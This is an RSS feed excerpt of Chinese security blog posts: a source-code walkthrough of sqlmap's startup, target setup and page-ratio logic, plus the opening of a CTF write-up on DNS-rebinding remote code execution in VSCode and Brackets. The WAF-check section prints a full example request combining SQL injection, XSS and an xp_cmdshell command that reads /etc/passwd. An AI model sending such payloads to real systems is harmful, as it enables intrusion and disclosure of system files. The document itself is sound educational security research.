data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我相信令大家困惑的可能是这两段关于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 的代码，在前面的部分中，我们没有详细说明 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 究竟意味着什么：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;
  Optimization:
    These options can be used to optimize the performance of sqlmap
​
    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)&lt;/code&gt;&lt;p&gt;根据官方手册的描述，&lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 是一种不用获取页面内容就可以知道页面大小的方法，这种方法在布尔盲注中有非常好的效果，可以很好的节省带宽。具体的原理详见&lt;a href=&quot;http://www.wisec.it/sectou.php?id=472f952d79293&quot;&gt;这一片古老的文章&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;明白这一点，上面的代码就变得异常好懂了，如果没有启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt; 优化，两次比较的页面分别为 &lt;code class=&quot;inline&quot;&gt;page&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt;。其实 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt; 也并不陌生，其实就是第一次正式访问页面的时候，存下的那个页面的内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
conf.originalPage = kb.pageTemplate = page&lt;/code&gt;&lt;p&gt;如果启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt;，计算 ratio 就只是很简单的通过页面的长度来计算，计算公式为 &lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
ratio = 1. * pageLength / len(kv.pageTemplate)
​
if ratio &amp;gt; 1.:
    ratio = 1. / ratio&lt;/code&gt;&lt;p&gt;接下来我们再顺着他的逻辑往下走：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fe348699c782f91fd21c2a65027dccb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;650&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fe348699c782f91fd21c2a65027dccb9&quot; data-watermark-src=&quot;v2-c5ec57535b9e20fd12d85af9c4971566&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据上面对源码的标注，我们很容易理解这个 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 是怎么算出来的，同样我们也很清楚，其实并不只是简单无脑的使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 就可以起到很好的效果，配合各种各样的选项或者预处理：比如移除页面的动态内容，只比较 &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt;，只比较文本，不比较 &lt;code class=&quot;inline&quot;&gt;html&lt;/code&gt; 标签。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cb294971e4a5551406807509e464c70_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1182&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8cb294971e4a5551406807509e464c70&quot; data-watermark-src=&quot;v2-8f38bc19f35863fd650048845660cbf7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上面源码为最终使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 对页面的相似度作出判断的逻辑，其中&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
UPPER_RATIO_BOUND = 0.98
LOWER_RATIO_BOUND = 0.02
DIFF_TOLERANCE = 0.05&lt;/code&gt;&lt;h2&gt;&lt;b&gt;0x05 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;阅读完本文，我相信读者对 sqlmap 中处理各种问题的细节都会有自己的理解，当然这是最好的。&lt;/p&gt;&lt;p&gt;在下一篇文章，笔者将会带大家进入更深层的 sqlmap 的逻辑，敬请期待。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-09-10-44157153</guid>
<pubDate>Mon, 10 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 I: 基础流程</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-29-43242220.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/43242220&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0de9ae59e29655770ea5df5a2aa92776_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一直在想准备一系列 sqlmap 的文章，担心会不会因为太老太旧了被大家吐槽，思前想后也查了一些现有的资料，还是准备出一部分关于 sqlmap 关键技术细节的探讨。同时也在对其核心的讨论中，提炼出一些思想与方法。sqlmap 内核分析系列文章共三篇，本文为第一篇，敬请指正。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我相信在阅读本文的读者中，很大一部分人都是曾经尝试阅读过 sqlmap 源码的同学。但是在实际阅读的时候，我们发现大家总是存在各种各样奇葩的困难与困惑。&lt;/p&gt;&lt;blockquote&gt;“SqlMap 源码为什么会有大几百行一千行的方法啊”“它里面 conf 和 kb 又是啥？这两个全局变量里面到底存了啥？”“为什么我直接把 sqlmap 的 xml 取出来，还是并不是特别方便使用他们的 payload”&lt;/blockquote&gt;&lt;p&gt;我相信这些疑问大家肯定第一次在阅读这个项目的事，都会遇到。实际上，并不是因为 sqlmap 项目的水平高导致大家看不懂。而是由于项目背负了太多的历史包袱，导致在接近十年的发展中，开发者与后期维护者并没有对这款工具进行重构与大规模重写，反而是继续使用 python2 对其缝缝补补。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-712750c7108b641649d3721495a5f40d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;764&quot; data-rawheight=&quot;284&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-712750c7108b641649d3721495a5f40d&quot; data-watermark-src=&quot;v2-5c07344e99ff5c13b56bbce7afeb8127&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在本系列文章中，我们主要针对 sqlmap 的最核心的方方面面进行分析，本文主要针对基础流程进行介绍与描述，本文由非常细致的 sqlmap 源码解读，希望有需要的读者可以从中受益。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 准备工作&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;想要阅读 sqlmap 源码我相信大家的选择肯定更多的是从 github 下直接 clone 代码到本地，直接使用本地编辑器或者 IDE 打开直接来分析。所以基本操作也就是&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap&lt;/code&gt;&lt;p&gt;进入 sqlmap 的 repos 下，直接打开编辑器吧！&lt;/p&gt;&lt;p&gt;当然很多读者是 Python3 用户，其实也没有必要费很大力气在本机上安装 Python2 然后再进行操作。笔者使用的环境是&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Mac OS X&lt;/li&gt;&lt;li&gt;Pyenv&lt;/li&gt;&lt;li&gt;VSCode&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;推荐使用 Pyenv（+virtualenv） 构建 Python 环境运行 sqlmap。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 初始化与底层建筑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;笔者当然可以直接指出所有的重要逻辑在什么位置，但是这样并不好。这样做的后果就是大家发出奇怪的疑问：&lt;/p&gt;&lt;blockquote&gt;它里面 conf 和 kb 又是啥？这两个全局变量里面到底存了啥？&lt;/blockquote&gt;&lt;p&gt;逐步熟悉整个项目的构建和项目中贯穿全局的两个奇怪的全局变量，对于加速理解 sqlmap 的核心逻辑起了很大的作用。在笔者的工作和实践中，确实是很有感触。&lt;/p&gt;&lt;p&gt;所以我们还是从头看起吧！&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7b344e94e680fa513e682a3b5d466940_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;824&quot; data-rawheight=&quot;666&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b344e94e680fa513e682a3b5d466940&quot; data-watermark-src=&quot;v2-06d2ddbe5501502bd0c6bdda720a58cd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们在上图中，可以找到很明显的程序命令行入口，我们暂且只分析命令行入口所以，我把无关的东西全部打了马赛克，所以接下来我们看到 &lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt; 函数直接来了解。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-43bc8948a61b7ca01eeea2ab047428de_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;524&quot; data-rawheight=&quot;559&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-43bc8948a61b7ca01eeea2ab047428de&quot; data-watermark-src=&quot;v2-636cd5928be38325916564577292864e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我相信大家看到了上图应该就知道我们主要应该看 &lt;code class=&quot;inline&quot;&gt;try&lt;/code&gt; 中的内容。实际上 &lt;code class=&quot;inline&quot;&gt;except&lt;/code&gt; 中指的是 sqlmap 中各种各样异常处理，包含让程序退出而释放的异常/用户异常以及各种预期或非预期异常，在 &lt;code class=&quot;inline&quot;&gt;finally&lt;/code&gt; 中，大致进行了数据库（HashDB）的检查/恢复/释放以及 &lt;code class=&quot;inline&quot;&gt;dumper&lt;/code&gt; 的收尾操作和多线程的资源回收操作。具体的不重要的代码我们就不继续介绍了，接下来直接来了解比较重要的部分吧。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fc053c2c16c65ff3ee15f55a4158ec5d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;525&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fc053c2c16c65ff3ee15f55a4158ec5d&quot; data-watermark-src=&quot;v2-15fe5125c6a3020e351f2dd5e72a1498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在实际在工作部分中，我们发现了 1-4 函数对环境和基础配置进行了一同操作，然后在 5 步骤的时候进行步骤初始化，然后开始启动 sqlmap。实际上这些操作并不是一无是处，接下来有详有略介绍这些步骤究竟发生了什么。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在 DirtyPatches 中，首先设定了 httplib 的最大行长度（&lt;code class=&quot;inline&quot;&gt;httplib._MAXLINE&lt;/code&gt;），接下来导入第三方的 windows 下的 ip地址转换函数模块（&lt;code class=&quot;inline&quot;&gt;win_inet_pton&lt;/code&gt;），然后对编码进行了一些替换，把 &lt;code class=&quot;inline&quot;&gt;cp65001&lt;/code&gt; 替换为 &lt;code class=&quot;inline&quot;&gt;utf8&lt;/code&gt; 避免出现一些交互上的错误，这些操作对于 sqlmap 的实际功能影响并不是特别大，属于保证起用户体验和系统设置的正常选项，不需要进行过多关心。&lt;/li&gt;&lt;li&gt;在环境检查中，做了如下操作：检查模块路径，检查 Python 版本，导入全局变量。我们可能并不需要关心太多这一步，只需要记得在这一步我们导入了几个关键的全局变量：&lt;code class=&quot;inline&quot;&gt;(&quot;cmdLineOptions&quot;, &quot;conf&quot;, &quot;kb&quot;)&lt;/code&gt;，需要提醒大家的是，直接去 &lt;code class=&quot;inline&quot;&gt;lib.core.data&lt;/code&gt; 中寻找这几个变量并不是明智的选择，因为他们并不是在这里初始化的（说白了就是找到了定义也没有用，只需要知道有他们几个就够啦）。&lt;/li&gt;&lt;li&gt;初始化各种资源文件路径。&lt;/li&gt;&lt;li&gt;打印 Banner。&lt;/li&gt;&lt;li&gt;这一部分可以说是非常关键了，虽然表面上仍然是属于初始化的阶段，但是实际上，如果不知晓这一步，面对后面的直接对全局变量 &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 的操作将会变的非常奇怪和陌生。在这步中，我们进行了配置文件初始化，知识库（KnowledgeBase初始化）以及用户操作的 &lt;code class=&quot;inline&quot;&gt;Merge&lt;/code&gt; 和初始化。我们在之后的分析中如果遇到了针对 &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 的操作，可以直接在这个函数对应的 &lt;code class=&quot;inline&quot;&gt;lib.core.option&lt;/code&gt; 模块中寻找对应的初始化变量的定义。当然，这一步涉及到的一些 &lt;code class=&quot;inline&quot;&gt;kb/conf&lt;/code&gt; 的 fields 也可能来源于 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中，可以直接通过 &lt;code class=&quot;inline&quot;&gt;ctrl+F&lt;/code&gt; 搜索到。&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-81288766ac31da8e9e2f049c8a987b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1138&quot; data-rawheight=&quot;570&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-81288766ac31da8e9e2f049c8a987b32&quot; data-watermark-src=&quot;v2-9fa8331cd060a98fcc2d11ce9dab2e26&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;中主要包含所有初始变量的初始值，这些初始值在 &lt;code class=&quot;inline&quot;&gt;init()&lt;/code&gt; 的设定主要是引用各种各样的函数来完成基础设置，我们没有必要依次对其进行分支，只需要用到的时候知道回来寻找就可以了。&lt;/li&gt;&lt;li&gt;冒烟测试，测试程序本身是否可以跑得通。&lt;/li&gt;&lt;li&gt;功能测试，测试 sqlmap 功能是否完整。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;进入上一段代码的条件是 &lt;code class=&quot;inline&quot;&gt;if not conf.updateAll&lt;/code&gt;，这个是来源于 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中定义的更新选项，如果这个选项打开，sqlmap 会自动更新并且不会执行后续测试步骤和实际工作的步骤。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7147c689ef37a795faf5d08e7f703ca6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1950&quot; data-rawheight=&quot;884&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7147c689ef37a795faf5d08e7f703ca6&quot; data-watermark-src=&quot;v2-d4372b7133e9b35129787b5b45a38cf6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在实际的启动代码中，笔者在上图中标注了两处，我们在使用命令行的时候，更多的是直接调用 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数，所以我们直接跟入其中寻找之后需要研究的部分。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 测试前的目标准备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当我们找到 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数的时候，映入眼帘的实际上是一个很平坦的流程，我们简化一下，以下图代码为例：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5a46a1adf51de4bc8193ad0f3e8966dd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1658&quot; data-rawheight=&quot;763&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5a46a1adf51de4bc8193ad0f3e8966dd&quot; data-watermark-src=&quot;v2-7855b8ab88049e96cbf57d43e8ee14ad&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们仍然看到了 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 中一些很奇怪的选项，针对这些选项我们在 0x01 节中强调过，可以在某一些地方找到这些选项的线索，我们以 &lt;code class=&quot;inline&quot;&gt;conf.direct&lt;/code&gt; 为例，可以在 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中明确找到这个选项的说明：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-318d59b0e4d7d6fd7aae65575a078363_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1972&quot; data-rawheight=&quot;1480&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-318d59b0e4d7d6fd7aae65575a078363&quot; data-watermark-src=&quot;v2-39dbe5162ee750945dc1de9ee4bd939d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据说明，这是直连数据库的选项，所以我们可能暂时并不需要关心他，我们暂时只关注 sqlmap 是如何检测漏洞的，而不关心他是怎么样调用数据库相关操作的。&lt;/p&gt;&lt;p&gt;接下来稍有一些想法的读者当然知道，我们直接进行第四部分针对这个目标循环的分析是最简单有效的办法了！&lt;/p&gt;&lt;p&gt;好的，接下来我们就打开最核心的检测方法：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e33fdbd94ef9457edf316c817cb0a3b6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1190&quot; data-rawheight=&quot;769&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e33fdbd94ef9457edf316c817cb0a3b6&quot; data-watermark-src=&quot;v2-e0f067acd87c38620b1bb69e9235dd8f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;进入循环体之后，首先进行检查网络是否通断的选项，这个选项很容易理解我们就不多叙述了；确保网络正常之后，开始设置 &lt;code class=&quot;inline&quot;&gt;conf.url,conf.method,conf.data,conf.cookie&lt;/code&gt; 和 headers 等字段，并且在 &lt;code class=&quot;inline&quot;&gt;parseTargetUrl()&lt;/code&gt; 中进行各种合理性检查；之后会根据 HTTP 的 Method 提取需要检查的参数；随后如果当前启动时参数接受了多个目标的话，会在第4步中做一些初始化的工作。&lt;/p&gt;&lt;p&gt;在完成上述操作之后，执行 &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; 这个函数也是一个非常重要的函数，其包含如下操作：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def setupTargetEnv():
    _createTargetDirs()
    _setRequestParams()
    _setHashDB()
    _resumeHashDBValues()
    _setResultsFile()
    _setAuthCred()&lt;/code&gt;&lt;p&gt;其中除了 &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; 都是关于本身存储（缓存）扫描上下文和结果文件的。当然我们最关注的点肯定是 &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; 这个点。在深入了解这一个步骤之后，我们发现其中主要涉及到如下操作：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-268cea4d6395e22a8ccb5f9c82947f6d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1216&quot; data-rawheight=&quot;760&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-268cea4d6395e22a8ccb5f9c82947f6d&quot; data-watermark-src=&quot;v2-553e8d329933128b44534a4e285c0e25&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6ed18233da3719acf9674e23c2acc6c2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1373&quot; data-rawheight=&quot;736&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6ed18233da3719acf9674e23c2acc6c2&quot; data-watermark-src=&quot;v2-089f806c9e175d73b2af49b39b63b3ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以我们回归之前的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 方法中的 foreach targets 的循环体中，在 &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; 之后，我们现在已经知道了关于这个目标的所有的可以尝试注入测试的点都已经设置好了，并且都存在了 &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; 这个字典中了。&lt;/p&gt;&lt;p&gt;至此，在正式开始检测之前，我们已经知道，&lt;code class=&quot;inline&quot;&gt;conf.url, conf.method, conf.headers ...&lt;/code&gt; 之类的包含基础的测试的目标的信息，在 &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; 中包含具体的不同位置的需要测试的参数的字典，可以方便随时渲染 Payload。关于其具体的行为，其实大可不必太过关心，因为我们其实并不需要具体的处理细节，这些细节应该是在我们遇到问题，或者遇到唔清楚的地方再跳出来在这些步骤中寻找，并且进行研究。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 万事俱备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;可以说在读者了解上面两节讲述的内容的时候，我们就可以正式探查真正的 SQL 注入检测时候 sqlmap 都坐上了什么。其实简单来说，需要经过下面步骤：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-934507fcca097d08998f6cac328b7403_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;618&quot; data-rawheight=&quot;886&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-934507fcca097d08998f6cac328b7403&quot; data-watermark-src=&quot;v2-ec9a1617b29b62d69fb350121f4705c1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;笔者通过对 &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数进行分析，得出了上面的流程图。在整个检测过程中，我们暂且不涉及细节；整个流程都是针对检查一个目标所要经历的步骤。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; 中，文档写明：&lt;code class=&quot;inline&quot;&gt;Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/code&gt;，我们可以在这里发现他的原理出处，有兴趣的读者可以自行研究。在实际实现的过程中代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8f9b7d72061fd974204b902da76ed344_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1510&quot; data-rawheight=&quot;627&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8f9b7d72061fd974204b902da76ed344&quot; data-watermark-src=&quot;v2-a34b45cfd5bf2eafb243178b1373a242&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;笔者在关键部分已经把标注和箭头写明，方便大家理解。我们发现 &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; 这个变量是通过随机一个数字 + space + 一个特制 Payload（涉及到很多的关于敏感关键词，可以很容易触发 WAF 拦截）。&lt;/p&gt;&lt;p&gt;随即，sqlmap 会把 payload 插入该插入的位置：对于 GET 类的请求，sqlmap 会在之前的 query 语句后面加入一个新的参数，这个参数名通过 &lt;code class=&quot;inline&quot;&gt;randomStr()&lt;/code&gt; 生成，参数的值就是经过处理的 Payload。如果有读者不理解，我们在这里可以举一个例子：&lt;/p&gt;&lt;p&gt;如果我们针对 &lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&lt;/code&gt;&lt;p&gt;这样的 URL 进行 Waf 的检查，sqlmap 会发起一个&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&amp;amp;mbjwe=2472%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--/%
2A%2A/%3B%20EXEC%20xp_cmdshell%28%27cat%20../../../etc/passwd%27%29%23&lt;/code&gt;&lt;p&gt;的新的请求，这个请求会有很大概率触发 Waf 的反应，然后 sqlmap 通过判断返回页面和之前页面的 &lt;b&gt;Page Ratio&lt;/b&gt; 来判断是否触发了 WAF。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们似乎遇到一些问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有心的读者可能发现，我们在上小节出现了一个神奇陌生的词 &lt;b&gt;Page Ratio&lt;/b&gt;, 这个词其实在整个 sqlmap 中是非常重要的存在，我们之后会在后续的文章中详细介绍这部分理论。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 然后呢？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实我们当然可以继续讲解每一个函数都做了什么，但是限于篇幅问题，我们可能要先暂停一下了；与此同时，我们本文的内容“基础流程”实际上已经介绍完了，并且引出了我们需要在下一篇文章介绍的概念之一“Page Ratio”。&lt;/p&gt;&lt;p&gt;所以接下来我们可能要结束本文了，但是我更希望的是，每一个读者都能够尝试自己分析，自己去吃透 sqlmap 的细节。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;感谢读者的耐心，在接下来的文章中，笔者将会更加深入介绍 sqlmap 最核心的算法和细节处理。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-08-29-43242220</guid>
<pubDate>Wed, 29 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Real World CTF doc2own 命题报告</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-08-41544965.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/41544965&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文作者：咸鱼&lt;/p&gt;&lt;p&gt;上个月的 realdworldctf 设计了一个完全真实的客户端软件 pwn 题目。&lt;/p&gt;&lt;p&gt;在接到出题邀请的时候也差点要“另请高明”了。当时正好在准备 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/21776300&quot;&gt;LoCCS 的暑期学校&lt;/a&gt;的课件，因为拖延搞得讲课前夜通宵没睡狂写 ppt，紧接着又安排出差，趁着飞机延误之类的边角时间写评测环境和测试 exploit 之类，最后还是在比赛已经开始的情况下才在第一个晚上把稳定性堪忧的环境部署上线。&lt;/p&gt;&lt;p&gt;仓促的出题过程也是埋下了伏笔。竟然在比赛过程中，先后有几支国际队伍交上了真正的 0day 利用。而赛后我简单反编译了程序，还发现了更多的远程代码执行问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;由于补丁今天刚刚发布，在这里我不会公开相关漏洞的细节。&lt;/b&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;在年初我偶然发现了一个 Visual Studio Code 的远程代码执行漏洞，而报告后发现被撞洞了。这个问题是 Electron 使用了 Chromium 的远程前端调试协议，是基于 http 和 WebSocket 的。&lt;/p&gt;&lt;p&gt;攻击者在知道调试端口的情况下，可以使用 dns 重绑定的技巧获得一个随机的 uuid，构造一个 WebSocket 协议的 url，向 Electron 的前端注入任意代码，实现 node.js 任意代码执行。&lt;/p&gt;&lt;p&gt;VSCode 在部分版本中意外开启了 Extension 进程的调试端口，只要浏览一个网页并停留数十秒（dns rebinding 需要一段时间让旧 dns 记录失效），计算机便可被远程控制：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;Visual Studio Code silently fixed a remote code execution vulnerability&lt;/a&gt;&lt;p&gt;受此启发我在 Adobe Brackets 上发现了完全一致的漏洞：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;CEF remote debugging is vulnerable to dns rebinding attack #14149&lt;/a&gt;&lt;p&gt;与 VSCode 不同的是，Adobe Brackets 没有使用 Electron，而是自行封装的 libCEF 框架，与 node.js 的集成方式也不同。Electron 可以在 window 的上下文中访问 node.js API，而 Brackets 的编辑器前端则没有提供这个功能，尽管 Brackets 当中使用到了 node.js 运行时。&lt;/p&gt;&lt;p&gt;不过 Brackets 在上下文中暴露了如下的两个对象：brackets 和 appshell&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; 